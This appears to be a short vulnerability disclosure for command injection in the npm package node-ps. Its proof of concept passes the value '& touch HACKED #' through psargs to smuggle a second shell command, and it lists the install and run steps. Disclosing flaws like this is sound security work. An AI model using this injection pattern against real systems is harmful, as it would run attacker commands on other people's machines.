# Description

Command Injection in node-ps

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var a =require("node-ps");
a.lookup({psargs:["& touch HACKED #"]},function(){})
```

2. Execute the following commands in terminal:

```
npm i node-ps # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
